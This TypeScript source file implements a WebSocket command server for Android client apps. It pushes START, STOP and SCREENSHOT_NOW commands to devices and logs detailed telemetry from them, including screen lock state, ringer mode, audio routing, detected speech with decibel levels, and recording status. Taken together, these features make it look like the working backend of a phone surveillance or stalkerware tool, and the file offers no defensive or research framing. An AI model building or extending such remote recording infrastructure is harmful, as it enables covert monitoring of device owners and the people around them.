/**
 * websocket.ts — Real-time 2-way persistent WebSocket Gateway.
 *
 * Provides instant, zero-latency communication with Android client APKs (WhatsApp/FB style):
 *   - Instant push commands (START / STOP / SCREENSHOT_NOW) with 0ms delay
 *   - Continuous connection health tracking with 15s keep-alive pings
 *   - Real-time device telemetry streaming (battery %, storage, audio routing)
 */

import http from 'http';
import { WebSocketServer, WebSocket } from 'ws';
import url from 'url';
import * as db from './database';

interface DeviceSocketMeta {
    ws: WebSocket;
    clientId: string;
    connectedAt: Date;
    lastPingAt: Date;
}

const activeDevices = new Map<string, DeviceSocketMeta>();
let wss: WebSocketServer | null = null;

export function initWebSocketServer(server: http.Server): WebSocketServer {
    wss = new WebSocketServer({
        server,
        path: '/ws/device',
    });

    wss.on('connection', (ws: WebSocket, req: http.IncomingMessage) => {
        const parsedUrl = url.parse(req.url || '', true);
        let clientId = (parsedUrl.query.client_id as string) || '';

        console.log(`[ws] New incoming WebSocket connection (query client_id: "${clientId}")`);

        const meta: DeviceSocketMeta = {
            ws,
            clientId,
            connectedAt: new Date(),
            lastPingAt: new Date(),
        };

        if (clientId) {
            registerDevice(clientId, meta);
        }

        // Send connection confirmation
        ws.send(JSON.stringify({
            type: 'connected',
            client_id: clientId,
            timestamp: new Date().toISOString(),
        }));

        ws.on('message', (data: Buffer | string) => {
            try {
                const message = JSON.parse(data.toString());
                handleDeviceMessage(meta, message);
            } catch (err) {
                console.error('[ws] Error parsing message from device:', err);
            }
        });

        ws.on('close', () => {
            if (meta.clientId && activeDevices.get(meta.clientId)?.ws === ws) {
                activeDevices.delete(meta.clientId);
                console.log(`[ws] Device disconnected: ${meta.clientId}`);
                try {
                    db.updateDeviceStatus(meta.clientId, 'offline');
                } catch { }
            }
        });

        ws.on('error', (err) => {
            console.error(`[ws] Socket error for ${meta.clientId || 'unknown'}:`, err);
        });
    });

    console.log('[ws] WebSocket Gateway initialized on /ws/device');
    return wss;
}

function registerDevice(clientId: string, meta: DeviceSocketMeta) {
    meta.clientId = clientId;
    activeDevices.set(clientId, meta);
    console.log(`[ws] Device registered on live socket: ${clientId}`);
    try {
        db.updateDeviceStatus(clientId, 'idle');
    } catch { }
}

function handleDeviceMessage(meta: DeviceSocketMeta, msg: any) {
    if (!msg || typeof msg !== 'object') return;

    switch (msg.type) {
        case 'register': {
            if (msg.client_id) {
                registerDevice(msg.client_id, meta);
                if (msg.device_info) {
                    try {
                        const existing = db.getDeviceCommand(msg.client_id);
                        if (!existing) {
                            db.setDeviceCommand(msg.client_id, 'NONE');
                        }
                    } catch { }
                }
            }
            break;
        }

        case 'ping': {
            meta.lastPingAt = new Date();
            if (meta.ws.readyState === WebSocket.OPEN) {
                meta.ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
            }
            break;
        }

        case 'telemetry': {
            const clientId = meta.clientId || msg.client_id;
            if (clientId) {
                const battery = msg.battery ?? '';
                const storageMb = msg.storage_mb ?? '';
                const route = msg.audio_route ?? '';
                const screenOn = msg.screen_on;
                const isUnlocked = msg.is_unlocked;
                const powerSource = msg.power_source;
                const ringerMode = msg.ringer_mode;
                const isSpeech = msg.is_speech;
                const audioDb = msg.audio_db;

                let routeStr = '';
                if (route === 'JCK') routeStr = ' | 🎧 Jack';
                else if (route === 'BLU') routeStr = ' | 🦷 Bluetooth';
                else if (route === 'SPK') routeStr = ' | 🔊 Speaker';

                let screenStr = '';
                if (screenOn === true || screenOn === 1) {
                    screenStr = isUnlocked ? ' | 📱 Screen ON (Unlocked)' : ' | 📱 Screen ON (Locked)';
                } else if (screenOn === false || screenOn === 0) {
                    screenStr = ' | 🌑 Screen OFF';
                }

                let powerStr = '';
                if (powerSource === 'CUSB') powerStr = ' | 💻 PC (USB)';
                else if (powerSource === 'CAC') powerStr = ' | ⚡ Wall AC';
                else if (powerSource === 'CWIR') powerStr = ' | 🛜 Wireless';

                let ringerStr = '';
                if (ringerMode === 'RS') ringerStr = ' | 🔇 Silent';
                else if (ringerMode === 'RV') ringerStr = ' | 📳 Vibrate';

                let audioStr = '';
                if (isSpeech) audioStr = ` | 🗣️ Speech (${audioDb || 0}dB)`;

                const telemetrySummary = `🔋 ${battery}% | 💾 ${storageMb}MB free${routeStr}${screenStr}${powerStr}${ringerStr}${audioStr}`;
                console.log(`[ws] Telemetry from ${clientId}: ${telemetrySummary}`);
            }
            break;
        }

        case 'command_ack': {
            const clientId = meta.clientId || msg.client_id;
            const command = msg.command;
            if (clientId && command) {
                console.log(`[ws] Command ACK received via socket from ${clientId}: ${command}`);
                try {
                    const current = db.getDeviceCommand(clientId);
                    if (current && current.command === command) {
                        db.clearDeviceCommand(clientId);
                    }
                } catch (e) {
                    console.error('[ws] Failed clearing acknowledged command:', e);
                }
            }
            break;
        }

        case 'status_update': {
            const clientId = meta.clientId || msg.client_id;
            const status = msg.status; // 'recording' | 'idle'
            if (clientId && status) {
                try {
                    db.updateDeviceStatus(clientId, status);
                } catch { }
            }
            break;
        }

        default:
            console.log(`[ws] Unknown message from ${meta.clientId}:`, msg);
    }
}

/**
 * Send an immediate command to a connected device via WebSocket (0ms latency).
 * Returns true if pushed over live socket, false if device not connected.
 */
export function sendDeviceCommand(clientId: string, command: string, payload: Record<string, any> = {}): boolean {
    const meta = activeDevices.get(clientId);
    if (!meta || meta.ws.readyState !== WebSocket.OPEN) {
        return false;
    }

    try {
        meta.ws.send(JSON.stringify({
            type: 'command',
            command,
            ...payload,
            timestamp: new Date().toISOString(),
        }));
        console.log(`[ws] ⚡ Instant command pushed via live socket to ${clientId}: ${command}`);
        return true;
    } catch (err) {
        console.error(`[ws] Failed to send command to ${clientId}:`, err);
        return false;
    }
}

/** Check if a device is currently connected to the live WebSocket */
export function isDeviceConnected(clientId: string): boolean {
    const meta = activeDevices.get(clientId);
    return !!meta && meta.ws.readyState === WebSocket.OPEN;
}

/** Get list of all currently connected device IDs */
export function getConnectedDevices(): string[] {
    const connected: string[] = [];
    for (const [id, meta] of activeDevices.entries()) {
        if (meta.ws.readyState === WebSocket.OPEN) {
            connected.push(id);
        }
    }
    return connected;
}
